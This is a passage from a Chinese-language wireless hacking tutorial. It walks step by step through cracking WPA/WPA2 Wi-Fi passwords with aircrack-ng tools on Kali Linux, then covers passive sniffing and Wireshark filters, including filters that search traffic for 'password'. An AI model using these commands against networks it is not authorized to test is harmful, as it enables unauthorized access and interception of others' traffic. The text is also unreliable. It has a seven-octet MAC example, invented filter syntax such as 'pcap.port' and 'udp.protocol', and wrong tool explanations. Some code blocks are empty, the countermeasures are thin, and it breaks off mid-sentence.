  # 第 32 章 如何实现 WPA 字典攻击 + 应对措施


  要对一个受 WPA 或 WPA2 保护的无线网络执行字典攻击，我们将遵循四个步骤的过程。


  1. 此时，我们想要找到要执行字典攻击的接入点（AP）的 BSSID。

  2. 一旦我们找到了想要攻击的接入点，就需要决定用于攻击的词表（wordlist）。正如其名所示，词表是一个单词列表，类似于字典，我们将尝试使用该单词列表对接入点进行测试。

  3. 第三步是生成身份验证流量。为了让攻击生效，我们需要能够捕获连接到接入点的合法用户，我们将生成该流量，以便我们可以在空气中对其进行嗅探。

  4. 最后，我们必须执行字典攻击。


  对于这种攻击，我们将使用 Kali Linux。要做到这一点，你必须打开终端并查看配置。输入 `iwconfig`，你应该能看到你的两个无线局域网适配器。无线
  `wlan1` 应该是集成在你设备中的无线网卡，而无线 `wlan0` 如果你成功桥接了设备，则是虚拟化的 Kali Linux LAN 适配器。你也将将用它来执行攻击。


  因此，你需要做的第一件事是将 Kali Linux 的 wlan 卡设置为监听模式（monitor mode），但在在此之前，你必须通过输入命令关闭无线局域网适配器：


  ```bash

  ifconfig wlan0 down

  ```

  接着输入：

  ```bash

  iwconfig wlan0 mode monitor

  ```

  此命令将你的无线局域网适配器置于监听模式。为了确保 wlan 恢复，你必须输入命令：

  ```bash

  ifconfig wlan0 up

  ```

  现在你的无线局域网适配器已恢复，你想确认它现在处于监听模式。为此，你需要输入命令：

  ```bash

  iwconfig

  ```

  在这里，你应该看到“Mode”字样，旁边应该显示网卡现在处于监听模式。


  你的下一步是找到你想要攻击的接入点的 BSSID。为此，你将使用名为 Aircrack 的工具，因此你需要输入：

  ```bash

  airodump-ng wlan0

  ```

  这将开始搜索广播的 BSSID。在这里，你会看到你正在捕获周围接入点的 BSSID 以及它们使用的通道。


  **注意：** 不要破坏邻居的无线网络，或者，除非你有书面授权，否则不要在生产环境中使用此工具。


  回到 Kali Linux，一旦找到了你想要攻击的无线 BSSID，你可以按 `Ctrl+C` 停止搜索。在 Kali 的输出中，你应该还有 BSSID 的 MAC
  地址，它通常是 12 位字符的字母和数字，你必须记录下来，因为在执行攻击时你需要该 MAC 地址。


  下一步是找到一个可以用来破入接入点的词表，Kali 有几个工具可以用于此目的。你也可以下载其他类似的工具，但使用名为 `Airodump` 的工具就能完成工作。因此你必须输入：

  ```bash

  airodump-ng –bssid 00:11:22:33:44:55:66 –channel 1 –write wepcracking wlan0

  ```

  **注意：** 这只是一个示例，但在我写 `00:11:22:33:44:55:66` 的地方，你必须输入要破解的 BSSID 的实际 MAC 地址，以及通道，因为通道可能是
  6 号或 11 号。


  一旦你成功执行上述命令，你将看到 `wlan0` 网络监控已开始。在这里，你会看到“data”列下的数据传输。请记住，这取决于密码的复杂性，可能需要几分钟。等待几分钟后，你应该有了足够的数据可以处理，因此你需要打开一个新的终端并输入：

  ```bash

  ls

  ```

  这将列出已捕获的文件。现在要破解密码，你必须输入命令：

  ```bash

  aircrack-ng wepcracking-01.cap

  ```

  这里 `wepcracking-01.cap` 是一个示例。`aircrack-ng` 通常会显示“KEY FOUND”来表示破解成功。如果使用的是 WEP，它会显示明文密钥；如果是
  WPA，你可能需要运行：

  ```bash

  aircrack-ng -w [wordlist_path] wepcracking-01.cap

  ```

  ```

  对于家庭或小型企业等环境，进行字典攻击是很容易的。因此，保护网络的第一件事是确保不要将密码告诉任何人，人们可能会把密码写在便利签上。保护你网络更好的方法是让字典攻击变得不可行，这可能需要很长时间。


  # 第 33 章 如何实施被动探测 + 应对措施


  任何人都可以监听空气中的无线信号。当你监听无线信号时，你可以调整无线电频率来监听来自接入点或客户端的特定流量，或者只是监听所有流量并在稍后处理。使用像 Wireshark
  这样的包分析器来显示它们。被动探测是收集信息的最佳方式之一，你不需要与系统进行主动交互。你可能会收集信息，例如：

  - 接入点的制造商是什么？

  - 客户端使用的 MAC 地址？

  - 公司使用什么安全机制？

  - 网络名称是什么？

  - 接入点是否设置了访问？

  - 是否有隐藏的网络名称？


  通过信息收集，你可以开始构建部署，然后进入计划攻击的第二阶段。通过被动探测阶段，你将绘制接入点部署的网络地图，记录它们的名称并识别网络可能存在的任何漏洞。如果黑客想要尝试访问企业网络，无线必须是发现信息的顶级方法之一。


  要捕获并显示空气中的流量，你需要一个名为 Wireshark 的工具。你可以从之前出的网站下载 Wireshark，也可以使用 Kali Linux 中自带工具。在
  Kali Linux 中操作，我们将遵循四个步骤的过程：


  1. 我们要做的第一件事是将无线适配器设置为监听模式。这将使适配器能够嗅探空气中的所有内容，捕获一切并传递给 Wireshark 程序显示，然后我们可以分析这些包。

  2. 我们可以选择空气中的所有内容，或者寻找特定 BSSID 或特定通道的流量。

  3. 一旦选择了 BSSID 和通道，我们就可以打开 Wireshark，选择为无线适配器设置的监听接口并开始捕获数据。

  4. 一旦捕获了足够的数据，我们就可以保存包以便以后分析。


  我们想要做的第一件事是将适配器设置为监听模式。在之前的章节中已经讨论了如何操作，但你可以通过输入命令来确保你的无线接口仍然处于监听模式：

  ```bash

  iwconfig

  ```

  这将允许你看到无线接口处于什么模式，但如果你没有进行我们目前讨论的任何其他更改，你的 wlan 应该仍然处于监听模式。有许多启用监听模式的方法，例如使用 `iwconfig`，但该方法并不适用于所有适配器。这种方法不适用于所有适配器，所以如果你尝试使用上面的命令启用监听模式失败了，或者成功了但适配器行为不符合预期，那么一个主意是尝试使用不同的方法启用监听模式。例如，如果你的无线适配器处于管理模式（Managed
  mode）且不知道如何将其变为监听模式，修复方法是输入以下命令禁用接口：

  ```bash

  ifconfig wlan0 down

  ```

  现在你可以去启用监听模式了，但在那之前，杀死任何可能干扰的进程是好的。为此你可以使用 `airmon-ng check`：

  ```bash

  airmon-ng check

  ```

  这将告诉 Kali 检查任何可能干扰的进程。为了杀死它们，你可以使用：

  ```bash

  airmon-ng start wlan0

  ```

  这将创建一个名为 `wlan0mon` 的接口。一旦准备好启用监听模式，你可以使用：

  ```bash

  airmon-ng start wlan0

  ```

  这将创建一个 `mon0` 接口。如果你的接口不是 `mon0`，则可以使用 `ls`。


  # 第 34 章 如何捕获 WiFi 流量 + 应对措施


  如果你想捕获无线流量，你可以使用：

  ```bash

  ifconfig-wlan0

  ```

  然后你可以使用工具来。要捕获流量，你可以使用 Wireshark 并遵循几个简单步骤。首先，在 Wireshark 中打开包捕获，然后输入你收集的任何文件名。


  过滤器。显示过滤器允许你过滤流量。例如，如果你只想看到 HTTP 流量，你可以输入：

  ```bash

  http

  ```

  如果你只想看到 HTTPS 流量，你可以输入：

  ```bash

  tls

  ```

  或者更具体地：

  ```bash

  pcap.port == 443

  ```

  如果你想同时看到 HTTP 和 HTTPS 流量，你可以输入：

  ```bash

  pcap.port == 80 || pcap.port == 443

  ```

  捕获过滤器允许你在保存包之前过滤流量。例如，如果你只想捕获 HTTP 流量，你可以输入：

  ```bash

  port 80

  ```

  如果你只想捕获 HTTPS 流量，你可以输入：

  ```bash

  port 443

  ```

  如果你想捕获所有 HTTP 和 HTTPS 流量，你可以输入：

  ```bash

  port == 80 || port == 443

  ```

  过滤器允许你通过其他标准过滤。例如，如果你只想捕获来自特定 IP 地址的流量，你可以输入：

  ```bash

  ip.addr == 192.168.1.1

  ```

  如果你只想捕获到特定 IP 地址的流量，你可以输入：

  ```

  ```

  一旦输入了过滤器并按回车，过滤器就会被应用。如果你想清除过滤器，可以点击过滤器旁边的 `X`。


  过滤器还允许你通过其他标准过滤。例如，如果你想找到包含特定字符串的包，你可以输入：

  ```bash

  contains "password"

  ```

  如果你想找到包含特定单词的包，你可以输入：

  ```bash

  matches "password"

  ```

  过滤器还允许你通过其他标准过滤。例如，如果你想找到所有特定大小的包，你可以输入：

  ```bash

  frame.len > 100

  ```

  如果你想找到所有特定大小的包，你可以输入：

  ```bash

  frame.len < 1000

  ```

  过滤器还允许你通过其他标准过滤。例如，如果你想找到所有特定协议的包，你可以输入：

  ```bash

  ip.protocol == 6

  ```

  如果你想找到所有特定协议的包，你可以输入：

  ```bash

  udp.protocol == 17

  ```

  过滤器还允许你通过其他标准过滤。例如，如果你想找到所有特定源端口的包，你可以输入：

  ```bash

  tcp.src.port == 80

  ```

  如果你想找到所有特定目的端口的包，你可以输入：

  ```bash

  tcp.dst.port == 443

  ```

  过滤器还允许你通过其他标准过滤。例如，如果你想找到所有特定 MAC 地址的包，你可以输入：

  ```bash

  eth.src == 00:11:22:33:44:55

  ```

  如果你想找到所有特定目的 MAC 地址的包，你可以输入：

